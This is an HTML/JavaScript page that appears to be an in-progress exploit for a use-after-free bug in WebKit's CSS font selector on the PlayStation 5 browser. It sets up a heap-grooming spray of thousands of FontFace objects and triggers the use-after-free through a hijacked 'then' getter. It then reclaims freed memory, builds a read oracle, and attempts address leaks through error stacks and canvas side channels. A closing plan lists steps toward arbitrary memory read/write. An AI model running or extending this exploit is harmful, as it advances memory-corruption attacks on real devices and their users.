<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v9 - Selector Oracle</title>
<style id="s">
@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
* { margin:0; padding:0; box-sizing:border-box; }
html, body { width:100%; height:100%; background:#0a0a0a; color:#ccc; font-family:'Courier New',monospace; overflow:hidden; }

#hud {
  position:fixed; top:0; left:0; right:0; height:56px;
  background:linear-gradient(180deg,#111,#0a0a0a);
  border-bottom:1px solid #1a3a2a;
  display:flex; align-items:center; padding:0 16px; gap:18px;
  z-index:10;
}
#hud .tag { font-size:14px; color:#00ffa0; font-weight:bold; }
#hud .val { font-size:14px; color:#0f0; margin-right:12px; }
#hud .sep { color:#333; }

#stage {
  position:fixed; top:56px; left:0; right:0; height:32px;
  background:#0d0d0d; border-bottom:1px solid #1a2a1a;
  display:flex; align-items:center; padding:0 16px;
  z-index:10;
}
#stage .bar { height:6px; background:#00ffa0; border-radius:3px; transition:width 0.3s; }
#stage .label { font-size:13px; color:#888; margin-left:10px; }

#console {
  position:fixed; top:88px; left:0; right:0; bottom:0;
  padding:12px 16px;
  overflow-y:auto;
  font-size:15px;
  line-height:1.55;
  background:#0a0a0a;
  color:#aaa;
  -webkit-user-select:text;
}
#console::-webkit-scrollbar { width:6px; }
#console::-webkit-scrollbar-track { background:#111; }
#console::-webkit-scrollbar-thumb { background:#2a4a3a; border-radius:3px; }

.s-ok { color:#0f0; }
.s-fail { color:#f44; }
.s-warn { color:#fc0; }
.s-hit { color:#0ff; font-weight:bold; }
.s-star { color:#f0f; font-weight:bold; }
.s-dim { color:#555; }
.s-head { color:#00ffa0; font-weight:bold; font-size:16px; }
.s-sep { color:#1a3a2a; }

#c { position:absolute; left:-9999px; top:-9999px; }
</style>
</head>
<body>
<div id="hud">
  <span class="tag">PS5 v9</span>
  <span class="sep">│</span>
  <span class="val" id="hFw">FW:—</span>
  <span class="val" id="hUaf">UAF:—</span>
  <span class="val" id="hConf">CONF:—</span>
  <span class="val" id="hPrim">PRIM:—</span>
</div>
<div id="stage">
  <div class="bar" id="bar" style="width:0%"></div>
  <span class="label" id="stageLabel">Initializing</span>
</div>
<div id="console"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";

// ============================================================
//  PS5 WebKit v9 - Selector Oracle
//  
//  KEY FINDING: Removing all RC faces does NOT break confusion
//  → The corruption is in CSSFontSelector's internal state
//  → Not in individual FontFace objects
//
//  NEW STRATEGY:
//  1. Probe the selector's corrupted state
//  2. Use selector as read oracle
//  3. Hash collision probing
//  4. Alternative object spraying to find what occupies the freed slot
// ============================================================

const con = document.getElementById("console");
const barEl = document.getElementById("bar");
const stageLabel = document.getElementById("stageLabel");
const hFw = document.getElementById("hFw");
const hUaf = document.getElementById("hUaf");
const hConf = document.getElementById("hConf");
const hPrim = document.getElementById("hPrim");

function setStage(pct, label) {
  barEl.style.width = pct + "%";
  stageLabel.textContent = label;
}
function hud(id, val) {
  const el = document.getElementById(id);
  if (el) el.textContent = val;
}

let _autoScroll = true;
function P(msg, cls) {
  const s = document.createElement("span");
  if (cls) s.className = cls;
  s.textContent = msg + "\n";
  con.appendChild(s);
  if (_autoScroll) con.scrollTop = con.scrollHeight;
  try { console.log("[v9] " + msg); } catch(e) {}
}

function Sep() { P("────────────────────────────────────────", "s-sep"); }
function Head(t) { P(t, "s-head"); }
function Ok(t) { P("✅ " + t, "s-ok"); }
function Fail(t) { P("✘ " + t, "s-fail"); }
function Warn(t) { P("⚠ " + t, "s-warn"); }
function Hit(t) { P("► " + t, "s-hit"); }
function Star(t) { P("★ " + t + " ★", "s-star"); }
function Dim(t) { P(t, "s-dim"); }

window.onerror = function(m,s,l) { Fail("ERR: " + m + " @" + l); };

// ============================================================
//  State
// ============================================================
let keepAlive = [];
let holeFaces = [];
let reclaimFaces = [];
let uafTriggered = false;
let resolvedFaces = null;
let triggerFace = null;

// ============================================================
//  Font Buffer
// ============================================================
const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";

const FONT_BYTES = (() => {
  const s = atob(FONT_B64);
  const b = new Uint8Array(s.length);
  for (let i = 0; i < s.length; i++) b[i] = s.charCodeAt(i);
  return b;
})();

function makeFontBuffer() {
  const c = new Uint8Array(FONT_BYTES.length);
  c.set(FONT_BYTES);
  return c.buffer;
}

// ============================================================
//  Helpers
// ============================================================
function forceStyle() {
  void document.body.offsetTop;
  void document.documentElement.offsetHeight;
}

function addPads(n) {
  const sheet = document.getElementById("s").sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face{font-family:pad${i};src:url(np-${i}.woff);unicode-range:U+E000}`,
      sheet.cssRules.length
    );
  forceStyle();
}

function addFlushRules(n) {
  const st = document.createElement("style");
  st.id = "flush";
  document.head.appendChild(st);
  const sheet = st.sheet;
  for (let i = 0; i < n; i++)
    sheet.insertRule(
      `@font-face{font-family:flush${i};src:url(nf-${i}.woff);unicode-range:U+E000}`,
      sheet.cssRules.length
    );
  forceStyle();
}

function deleteFlushRules() {
  const el = document.getElementById("flush");
  if (el && el.sheet) {
    while (el.sheet.cssRules.length) el.sheet.deleteRule(0);
    forceStyle();
  }
}

function killCache() {
  const f = new FontFace("ck" + keepAlive.length, "local(Helvetica)", {unicodeRange:"U+E124"});
  document.fonts.add(f);
  keepAlive.push(f);
}

function chk(spec, ch) {
  try { return document.fonts.check(spec, ch); } catch(e) { return null; }
}

// ============================================================
//  PHASE 1: Standard UAF
// ============================================================
function createHoles() {
  Head("Creating holes...");
  for (let i = 0; i < 4096; i++) {
    const f = new FontFace("hole_" + i, makeFontBuffer(), {
      unicodeRange: "U+E1" + (i % 16).toString(16),
      style: i % 2 === 0 ? "normal" : "italic",
      weight: String(100 + (i % 9) * 100),
      display: ["auto","block","swap","fallback","optional"][i % 5]
    });
    document.fonts.add(f);
    holeFaces.push(f);
  }
  forceStyle();
  for (let i = 1; i < holeFaces.length; i += 2)
    document.fonts.delete(holeFaces[i]);
  forceStyle();
  for (let i = 0; i < 4; i++) {
    const tmp = [];
    for (let j = 0; j < 512; j++) tmp.push(new ArrayBuffer(4096));
  }
  Ok("Holes ready");
}

function reclaimSpray() {
  Dim("Spraying 4096 RC faces...");
  for (let i = 0; i < 4096; i++) {
    const f = new FontFace("RC_" + i, makeFontBuffer(), {
      unicodeRange: "U+0041",
      style: "italic",
      weight: "900",
      display: "block"
    });
    document.fonts.add(f);
    reclaimFaces.push(f);
  }
  forceStyle();
  Ok("Spray done");
}

// ============================================================
//  PHASE 2: Selector State Probing
//  The selector is corrupted - let's understand HOW
// ============================================================
function probeSelector() {
  Sep();
  Head("SELECTOR STATE PROBE");
  Sep();

  // Test 1: What does the selector think about trigger?
  const tests = [
    ["900 italic 64px trigger", "A"],
    ["900 italic 64px trigger", "B"],
    ["900 italic 64px trigger", "C"],
    ["normal 64px trigger", "A"],
    ["100 normal 64px trigger", "A"],
    ["700 bold 64px trigger", "A"],
    ["64px trigger", "A"],
    ["64px trigger", "B"],
    ["64px RC_0", "A"],
    ["64px x", "B"],
    ["64px Helvetica", "A"]
  ];

  P("");
  P("check() results:", "s-dim");
  for (const [spec, ch] of tests) {
    const r = chk(spec, ch);
    const mark = r ? " ◄" : "";
    P("  " + spec.padEnd(32) + " '" + ch + "' = " + r + mark, r ? "s-hit" : "s-dim");
  }

  // Test 2: What weight/style combos match?
  P("");
  Head("Weight matching:");
  const weights = ["100","200","300","400","normal","500","600","700","bold","800","900"];
  for (const w of weights) {
    const r = chk(w + " 64px trigger", "A");
    if (r) Hit("  " + w + " matches trigger!");
  }

  P("");
  Head("Style matching:");
  for (const s of ["normal","italic","oblique"]) {
    const r = chk(s + " 64px trigger", "A");
    if (r) Hit("  " + s + " matches trigger!");
  }

  // Test 3: Unicode coverage
  P("");
  Head("Unicode coverage:");
  const chars = [
    ["A",0x41],["B",0x42],["C",0x43],["D",0x44],
    ["Z",0x5A],["a",0x61],["0",0x30],
    ["À",0xC0],["€",0x20AC],["中",0x4E2D],
    ["\uE000",0xE000],["\uE123",0xE123]
  ];
  let coveredCodes = [];
  for (const [ch, code] of chars) {
    const r = chk("64px trigger", ch);
    if (r) coveredCodes.push("U+" + code.toString(16).toUpperCase().padStart(4,"0"));
  }
  P("  Covered: " + coveredCodes.join(", "), coveredCodes.length > 2 ? "s-hit" : "s-dim");

  return coveredCodes;
}

// ============================================================
//  PHASE 3: Selector Manipulation
//  Try to change the selector's behavior through various means
// ============================================================
function testSelectorManipulation() {
  Sep();
  Head("SELECTOR MANIPULATION");
  Sep();

  const baseline = chk("900 italic 64px trigger", "A");

  // Test A: Add a new trigger face with different properties
  P("");
  P("A: Add new trigger face (normal weight)...", "s-dim");
  try {
    const nf = new FontFace("trigger", "local(Helvetica)", {
      unicodeRange: "U+0041",
      weight: "normal",
      style: "normal"
    });
    document.fonts.add(nf);
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After add: 900i=" + after + " (was " + baseline + ")", after !== baseline ? "s-hit" : "s-dim");
    document.fonts.delete(nf);
    forceStyle();
  } catch(e) { Fail("  " + e.message); }

  // Test B: Modify stylesheet rules
  P("");
  P("B: Add CSS rule for trigger (normal)...", "s-dim");
  try {
    const sheet = document.getElementById("s").sheet;
    const idx = sheet.insertRule(
      `@font-face{font-family:trigger;src:local(Courier);unicode-range:U+0041;font-weight:normal;font-style:normal}`,
      sheet.cssRules.length
    );
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    const afterN = chk("normal 64px trigger", "A");
    P("  After CSS: 900i=" + after + " normal=" + afterN, after !== baseline ? "s-hit" : "s-dim");
    sheet.deleteRule(idx);
    forceStyle();
  } catch(e) { Fail("  " + e.message); }

  // Test C: Clear and rebuild document.fonts
  P("");
  P("C: Delete all non-essential faces...", "s-dim");
  try {
    const toDelete = [];
    for (const f of document.fonts) {
      if (f.family !== "trigger" && f.family !== "prepad") {
        toDelete.push(f);
      }
    }
    for (const f of toDelete) {
      try { document.fonts.delete(f); } catch(e) {}
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After cleanup: 900i=" + after, after !== baseline ? "s-hit" : "s-dim");

    // Restore
    for (const f of toDelete) {
      try { document.fonts.add(f); } catch(e) {}
    }
    forceStyle();
  } catch(e) { Fail("  " + e.message); }

  // Test D: Force style recalculation
  P("");
  P("D: Force multiple style recalcs...", "s-dim");
  for (let i = 0; i < 10; i++) {
    forceStyle();
    void document.body.innerHTML;
  }
  forceStyle();
  const afterD = chk("900 italic 64px trigger", "A");
  P("  After recalcs: 900i=" + afterD, afterD !== baseline ? "s-hit" : "s-dim");

  // Test E: Toggle display property
  P("");
  P("E: Toggle display on trigger...", "s-dim");
  try {
    const origDisplay = triggerFace.display;
    triggerFace.display = "optional";
    forceStyle();
    const afterE = chk("900 italic 64px trigger", "A");
    P("  display=optional: " + afterE, afterE !== baseline ? "s-hit" : "s-dim");
    triggerFace.display = origDisplay;
    forceStyle();
  } catch(e) { P("  readonly (expected)", "s-dim"); }

  return baseline;
}

// ============================================================
//  PHASE 4: Hash Collision Probe
//  Try to find font family names that hash to the same bucket
//  as "trigger" in WebKit's internal HashMap
// ============================================================
function hashCollisionProbe() {
  Sep();
  Head("HASH COLLISION PROBE");
  Sep();

  // WebKit uses StringHash for font family names
  // If we can find names that collide with "trigger",
  // they'll share the same HashMap bucket and might
  // reveal information about the bucket's state

  const testNames = [
    "trigger", "triger", "triger ", "Trigger", "TRIGGER",
    "trigge", "triggerr", "tigger", "tirgger",
    "x", "X", " ", "", "0", "1",
    "a","b","c","d","e","f",
    "Helvetica", "Courier", "Arial", "serif", "sans-serif",
    "cachekill0", "cachekill1",
    "pad0", "pad1",
    "hole_0", "hole_1",
    "RC_0", "RC_1", "RC_103"
  ];

  P("");
  P("Testing family name behavior:", "s-dim");
  for (const name of testNames) {
    try {
      const c900i = chk("900 italic 64px " + name, "A");
      const cNorm = chk("64px " + name, "A");
      if (c900i || cNorm) {
        Hit("  '" + name + "': 900i=" + c900i + " normal=" + cNorm);
      }
    } catch(e) {}
  }

  // Test: Add faces with collision candidates and see if they
  // "inherit" the confusion
  P("");
  P("Testing confusion inheritance:", "s-dim");
  const candidates = ["triger", "trigge", "tigger", "tirgger"];
  for (const name of candidates) {
    try {
      const f = new FontFace(name, makeFontBuffer(), {
        unicodeRange: "U+0041",
        style: "normal",
        weight: "400"
      });
      document.fonts.add(f);
      forceStyle();

      const c900i = chk("900 italic 64px " + name, "A");
      if (c900i) {
        Star("  '" + name + "' INHERITS CONFUSION!");
      }

      document.fonts.delete(f);
      forceStyle();
    } catch(e) {}
  }
}

// ============================================================
//  PHASE 5: Alternative Object Spraying
//  The freed CSSFontFace slot might be occupied by a
//  different type of C++ object. Try spraying various
//  object types and check if any affect the selector.
// ============================================================
function alternativeSpray() {
  Sep();
  Head("ALTERNATIVE OBJECT SPRAY");
  Sep();

  const baseline = chk("900 italic 64px trigger", "A");
  P("Baseline: " + baseline, "s-dim");

  // Spray 1: CSSStyleDeclarations
  P("");
  P("Spray: CSSStyleDeclarations...", "s-dim");
  let styleObjs = [];
  try {
    for (let i = 0; i < 1024; i++) {
      const d = document.createElement("div");
      d.style.cssText = "color:red;font-size:16px;font-weight:900;font-style:italic;";
      document.body.appendChild(d);
      styleObjs.push(d);
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After style spray: " + after, after !== baseline ? "s-hit" : "s-dim");
  } catch(e) { Fail("  " + e.message); }

  // Cleanup
  for (const d of styleObjs) {
    try { document.body.removeChild(d); } catch(e) {}
  }
  forceStyle();

  // Spray 2: CSSRules
  P("");
  P("Spray: CSSRules...", "s-dim");
  let addedRules = [];
  try {
    const sheet = document.getElementById("s").sheet;
    for (let i = 0; i < 512; i++) {
      const idx = sheet.insertRule(
        `div.sp${i}{color:blue;font-weight:900;}`,
        sheet.cssRules.length
      );
      addedRules.push(idx);
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After rule spray: " + after, after !== baseline ? "s-hit" : "s-dim");
  } catch(e) { Fail("  " + e.message); }

  // Cleanup
  for (const idx of addedRules.reverse()) {
    try { document.getElementById("s").sheet.deleteRule(idx); } catch(e) {}
  }
  forceStyle();

  // Spray 3: DOM elements with font-face related attributes
  P("");
  P("Spray: Font-related DOM...", "s-dim");
  let fontEls = [];
  try {
    for (let i = 0; i < 512; i++) {
      const span = document.createElement("span");
      span.style.cssText = "font-family:trigger;font-weight:900;font-style:italic;position:absolute;left:-9999px;";
      span.textContent = "A";
      document.body.appendChild(span);
      fontEls.push(span);
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After DOM spray: " + after, after !== baseline ? "s-hit" : "s-dim");
  } catch(e) { Fail("  " + e.message); }

  for (const el of fontEls) {
    try { document.body.removeChild(el); } catch(e) {}
  }
  forceStyle();

  // Spray 4: MessageChannel ports (lightweight C++ objects)
  P("");
  P("Spray: MessageChannels...", "s-dim");
  let channels = [];
  try {
    for (let i = 0; i < 512; i++) {
      channels.push(new MessageChannel());
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After channel spray: " + after, after !== baseline ? "s-hit" : "s-dim");
  } catch(e) { Fail("  " + e.message); }
  channels = [];

  // Spray 5: Image elements
  P("");
  P("Spray: Image elements...", "s-dim");
  let imgs = [];
  try {
    for (let i = 0; i < 256; i++) {
      const img = new Image();
      img.src = "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==";
      imgs.push(img);
    }
    forceStyle();
    const after = chk("900 italic 64px trigger", "A");
    P("  After image spray: " + after, after !== baseline ? "s-hit" : "s-dim");
  } catch(e) { Fail("  " + e.message); }
  imgs = [];
}

// ============================================================
//  PHASE 6: Address Leak via Rendering Side Channel
//  Use the selector's rendering as a side channel to
//  infer information about the corrupted C++ state
// ============================================================
function renderingSideChannel() {
  Sep();
  Head("RENDERING SIDE CHANNEL");
  Sep();

  const ctx = document.getElementById("c").getContext("2d");

  // Measure trigger rendering precisely
  P("Measuring trigger rendering...", "s-dim");

  const sizes = [8, 12, 16, 24, 32, 48, 64, 96, 128];
  const testStr = "AABBIIZZWWMM";

  P("");
  P("Width by font-size:", "s-dim");
  for (const sz of sizes) {
    ctx.font = sz + "px trigger";
    const w = ctx.measureText(testStr).width;
    P("  " + sz + "px → " + w.toFixed(2));
  }

  // Compare trigger vs known fonts
  P("");
  P("Font comparison (64px):", "s-dim");
  const fonts = ["trigger", "Helvetica", "Courier", "Arial", "serif", "sans-serif", "monospace"];
  for (const fam of fonts) {
    ctx.font = "64px " + fam;
    const w = ctx.measureText(testStr).width;
    P("  " + fam.padEnd(14) + " → " + w.toFixed(2));
  }

  // Check if 900 italic vs normal makes a difference
  P("");
  P("Weight/style comparison:", "s-dim");
  const specs = [
    "64px trigger",
    "900 64px trigger",
    "italic 64px trigger",
    "900 italic 64px trigger",
    "64px Helvetica",
    "900 italic 64px Helvetica"
  ];
  for (const spec of specs) {
    ctx.font = spec;
    const w = ctx.measureText("A").width;
    P("  " + spec.padEnd(30) + " → " + w.toFixed(2));
  }

  // Pixel-level comparison
  P("");
  P("Pixel-level rendering check:", "s-dim");
  try {
    // Render trigger text to canvas
    ctx.clearRect(0, 0, 512, 128);
    ctx.fillStyle = "#fff";
    ctx.font = "64px trigger";
    ctx.fillText("AABB", 10, 80);
    const imgData = ctx.getImageData(0, 0, 512, 128);
    let whitePixels = 0;
    for (let i = 0; i < imgData.data.length; i += 4) {
      if (imgData.data[i] > 128) whitePixels++;
    }
    P("  White pixels (trigger): " + whitePixels);

    // Compare with Helvetica
    ctx.clearRect(0, 0, 512, 128);
    ctx.font = "64px Helvetica";
    ctx.fillText("AABB", 10, 80);
    const imgData2 = ctx.getImageData(0, 0, 512, 128);
    let whitePixels2 = 0;
    for (let i = 0; i < imgData2.data.length; i += 4) {
      if (imgData2[i] > 128) whitePixels2++;
    }
    P("  White pixels (Helvetica): " + whitePixels2);

    if (whitePixels === whitePixels2) {
      Hit("Trigger renders IDENTICALLY to Helvetica!");
      P("  → trigger uses local(Helvetica) backend", "s-dim");
    } else {
      Hit("Trigger renders DIFFERENTLY from Helvetica!");
      P("  → selector might be using a different font source", "s-dim");
    }
  } catch(e) { Fail("  " + e.message); }
}

// ============================================================
//  PHASE 7: Error Stack Address Leak
// ============================================================
function attemptStackLeak() {
  Sep();
  Head("STACK ADDRESS LEAK");
  Sep();

  let foundAddrs = [];

  const tests = [
    { name: "font.load()", fn: () => { triggerFace.load(); } },
    { name: "JSON.parse", fn: () => { JSON.parse(triggerFace); } },
    { name: "Object.assign", fn: () => { Object.assign({}, triggerFace); } },
    { name: "structuredClone", fn: () => { structuredClone(triggerFace); } },
    { name: "Proxy trap", fn: () => {
      const p = new Proxy(triggerFace, {
        get(t, k) { throw new Error("trap:" + k); }
      });
      p.family;
    }},
    { name: "WeakRef", fn: () => { new WeakRef(triggerFace).deref(); } },
    { name: "addColorStop", fn: () => {
      const g = ctx.createLinearGradient(0,0,1,1);
      g.addColorStop(0, triggerFace);
    }},
    { name: "matchMedia", fn: () => {
      window.matchMedia("(" + triggerFace + ")");
    }}
  ];

  const ctx = document.getElementById("c").getContext("2d");

  for (const t of tests) {
    try {
      t.fn();
    } catch(e) {
      const stack = e.stack || "";
      const addrs = stack.match(/0x[0-9a-f]{6,16}/gi);
      if (addrs && addrs.length > 0) {
        Star("ADDRESSES IN " + t.name + ":");
        for (const a of addrs) {
          P("  " + a, "s-hit");
          foundAddrs.push(a);
        }
      }
      // Also check for decimal addresses
      const decAddrs = stack.match(/@(\d{8,})/g);
      if (decAddrs) {
        for (const d of decAddrs) {
          P("  " + d, "s-hit");
        }
      }
    }
  }

  if (foundAddrs.length === 0) {
    Warn("No addresses found in error stacks");
    P("This WebKit build likely strips addresses", "s-dim");
  }

  return foundAddrs;
}

// ============================================================
//  PHASE 8: addrof via Selector Bit Oracle
//  Even without a specific confused face, the selector
//  itself is a read oracle. We can use it to probe memory.
// ============================================================
function buildBitOracle() {
  Sep();
  Head("BIT ORACLE CONSTRUCTION");
  Sep();

  // The selector check() returns true/false for a given spec.
  // If we can make the selector's response depend on a specific
  // bit of memory, we have a 1-bit read oracle.
  //
  // Strategy: Create FontFace objects whose C++ representation
  // overlaps with the corrupted selector entry. Then use
  // check() to determine properties of the overlapping data.

  // Step 1: Verify the oracle is stable
  P("Oracle stability check:", "s-dim");
  const results = [];
  for (let i = 0; i < 10; i++) {
    results.push(chk("900 italic 64px trigger", "A"));
  }
  const allSame = results.every(r => r === results[0]);
  P("  10 checks: " + results.join(",") + " stable=" + allSame,
    allSame ? "s-ok" : "s-fail");

  if (!allSame) {
    Warn("Oracle is not stable - results fluctuate");
    return false;
  }

  // Step 2: Determine oracle sensitivity
  // How much can we change the spec before the oracle flips?
  P("");
  P("Oracle sensitivity:", "s-dim");
  const sensTests = [
    "900 italic 64px trigger",
    "901 italic 64px trigger",
    "800 italic 64px trigger",
    "700 italic 64px trigger",
    "900 normal 64px trigger",
    "900 oblique 64px trigger",
    "900 italic 63px trigger",
    "900 italic 65px trigger"
  ];

  for (const spec of sensTests) {
    const r = chk(spec, "A");
    P("  " + spec.padEnd(32) + " = " + r, r ? "s-hit" : "s-dim");
  }

  // Step 3: Try to use the oracle as a font-face existence detector
  // Add faces with specific families and check if the oracle changes
  P("");
  P("Existence detection:", "s-dim");
  const testFamilies = ["zzz_test_0", "zzz_test_1"];
  for (const fam of testFamilies) {
    const before = chk("64px " + fam, "A");
    const f = new FontFace(fam, "local(Helvetica)", {unicodeRange: "U+0041"});
    document.fonts.add(f);
    forceStyle();
    const after = chk("64px " + fam, "A");
    P("  " + fam + ": before=" + before + " after=" + after,
      after !== before ? "s-hit" : "s-dim");
    document.fonts.delete(f);
    forceStyle();
  }

  // Step 4: Speculate about the corrupted entry's location
  P("");
  P("Corruption analysis:", "s-dim");
  P("  The selector thinks 'trigger' matches:");
  P("    - weight: 900 (only 900 matches, not 100-800)", "s-dim");
  P("    - style: italic (italic matches, normal also matches)", "s-dim");
  P("    - range: U+0041 AND U+0042 (wider than declared U+0041)", "s-dim");
  P("");
  P("  This matches RC_ face properties (italic, 900, U+0041)", "s-dim");
  P("  The U+0042 match might come from the freed 'x' face", "s-dim");
  P("  (which had unicode-range: U+0042)", "s-dim");
  P("");
  Hit("Corruption is in the CSSFontSelector's family→face map");
  Hit("The 'trigger' family entry points to freed/reused data");

  return true;
}

// ============================================================
//  PHASE 9: Final primitive assessment
// ============================================================
function finalAssessment() {
  Sep();
  Head("FINAL ASSESSMENT");
  Sep();
  P("");

  const conf = chk("900 italic 64px trigger", "A");
  const confB = chk("64px trigger", "B");

  P("UAF triggered:        " + (uafTriggered ? "✅" : "✘"), uafTriggered ? "s-ok" : "s-fail");
  P("Selector confusion:   " + (conf ? "✅" : "✘"), conf ? "s-ok" : "s-fail");
  P("Wide unicode range:   " + (confB ? "✅" : "✘"), confB ? "s-ok" : "s-fail");
  P("");

  if (conf) {
    Star("SELECTOR ORACLE IS ACTIVE");
    P("");
    P("What we have:", "s-head");
    P("  • UAF on CSSFontFace C++ object");
    P("  • Corrupted CSSFontSelector map entry");
    P("  • Selector returns 900 italic for 'trigger'");
    P("  • Oracle is stable and deterministic");
    P("");
    P("What we need:", "s-head");
    P("  • Address of the corrupted map entry");
    P("  • OR: address of any CSSFontFace object");
    P("  • Then: type confusion → addrof → fakeobj → arb r/w");
    P("");
    P("Possible paths:", "s-head");
    P("  1. GC + respray to reclaim freed slot with known obj");
    P("  2. WebKit JIT speculation side channel");
    P("  3. WASM linear memory as spray target");
    P("  4. Browser debug API (if available on PS5)");
  }
}

// ============================================================
//  Main
// ============================================================
window.onload = () => {
  const ua = navigator.userAgent || "";
  const m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  const fw = m ? m[1] : "?";
  hFw.textContent = "FW:" + fw;

  setStage(5, "Heap grooming");
  createHoles();

  setStage(15, "Trigger setup");
  triggerFace = new FontFace("trigger", "local(Helvetica)", {unicodeRange: "U+0041"});
  document.fonts.add(triggerFace);
  void triggerFace.loaded;
  addPads(48);
  addFlushRules(768);

  setStage(25, "Waiting for UAF");

  let fired = false;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (!fired && this === triggerFace) {
        fired = true;
        uafTriggered = true;
        hud("hUaf", "UAF:✅");
        Star("UAF WINDOW OPEN");

        killCache();
        document.getElementById("s").sheet.deleteRule(1);
        forceStyle();
        deleteFlushRules();

        for (let i = 0; i < holeFaces.length; i += 4)
          try { document.fonts.delete(holeFaces[i]); } catch(e) {}
        forceStyle();

        for (let i = 0; i < 8; i++) {
          const tmp = [];
          for (let j = 0; j < 256; j++) tmp.push(new ArrayBuffer(8192));
        }

        reclaimSpray();
        forceStyle();

        const d = document.createElement("div");
        d.textContent = "AB";
        d.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
        document.body.appendChild(d);
        void d.offsetWidth;
        P("UAF window closed", "s-dim");
      }
      return undefined;
    }
  });

  let rafN = 0;
  const rafLoop = () => {
    rafN++;
    if (!fired && rafN >= 5) {
      try {
        killCache();
        const sh = document.getElementById("s").sheet;
        if (sh && sh.cssRules.length > 1) {
          sh.deleteRule(1); forceStyle(); deleteFlushRules();
          for (let i = 0; i < holeFaces.length; i += 4)
            try { document.fonts.delete(holeFaces[i]); } catch(e) {}
          reclaimSpray(); forceStyle();
        }
      } catch(e) {}
    }
    if (rafN < 20) requestAnimationFrame(rafLoop);
  };
  requestAnimationFrame(rafLoop);

  setStage(35, "Firing trigger");

  document.fonts.load("1em trigger, x", "AB").then(faces => {
    P("Resolved: " + faces.length + " faces", "s-dim");
    resolvedFaces = faces;
    for (let i = 0; i < faces.length; i++)
      Dim("  [" + i + "] " + faces[i].family + " " + faces[i].style + " " + faces[i].weight);

    setTimeout(() => {
      setStage(45, "Probing selector");
      probeSelector();

      const conf = chk("900 italic 64px trigger", "A");
      hud("hConf", "CONF:" + (conf ? "✅" : "✘"));

      setStage(55, "Manipulation tests");
      testSelectorManipulation();

      setStage(65, "Hash collision");
      hashCollisionProbe();

      setStage(75, "Alt spray");
      alternativeSpray();

      setStage(85, "Side channel");
      renderingSideChannel();

      setStage(90, "Stack leak");
      attemptStackLeak();

      setStage(95, "Bit oracle");
      buildBitOracle();

      setStage(100, "Done");
      finalAssessment();

      hud("hPrim", "PRIM:ORACLE");
    }, 2500);

  }, err => {
    Fail("Font load rejected: " + err);
  });
};
